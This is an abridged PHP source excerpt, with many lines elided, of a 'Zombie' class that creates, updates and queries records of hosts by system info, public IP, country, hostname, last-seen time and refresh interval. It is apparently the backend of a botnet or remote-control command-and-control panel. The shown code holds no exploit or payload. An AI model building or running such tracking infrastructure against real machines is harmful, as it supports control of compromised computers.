...
class Zombie{
    ...
    function usernameExists(){
        ...
        $query = "SELECT id, username, created_at, updated_at, last_seen, sysinfo, current_public_ip, current_country, current_hostname, refresh_secs
    ...
    function create(){
        if(!$this->usernameExists()) {
            ...
            // sanitize
            $this->username=htmlspecialchars(strip_tags($this->username));
            $this->sysinfo=htmlspecialchars(strip_tags($this->sysinfo));
            ...
            $stmt->bindParam(':sysinfo', $this->sysinfo);
    ...
    public function update(){
        ...
        if($this->usernameExists()) {
            ...
            $columns_to_update = "";
            $columns_to_update = !empty($this->sysinfo) ? "sysinfo = :sysinfo" : "";
            if (!empty($this->current_public_ip)) {
                if (!empty($columns_to_update)) { $columns_to_update = $columns_to_update . ', ';}
                 $columns_to_update = $columns_to_update . "current_public_ip = :current_public_ip";
            }
            if (!empty($this->current_country)) {
                if (!empty($columns_to_update)) { $columns_to_update = $columns_to_update . ', ';}
                 $columns_to_update = $columns_to_update . "current_country = :current_country";
            }
            if (!empty($this->current_hostname)) {
                if (!empty($columns_to_update)) { $columns_to_update = $columns_to_update . ', ';}
                 $columns_to_update = $columns_to_update . "current_hostname = :current_hostname";
            }
            if (!empty($this->refresh_secs)) {
                if (!empty($columns_to_update)) { $columns_to_update = $columns_to_update . ', ';}
                 $columns_to_update = $columns_to_update . "refresh_secs = :refresh_secs";
            }
    ...
    function read($filter_by_id=False, $filter_by_username=False, $filter_by_datetime_bef=False,$filter_by_datetime_aft=False, 
        ...
        if($filter_by_os){
            $sysinfo=htmlspecialchars(strip_tags($filter_by_os));
            $stmt->bindParam(':sysinfo', $sysinfo);
        }
        if($filter_by_datetime_aft){
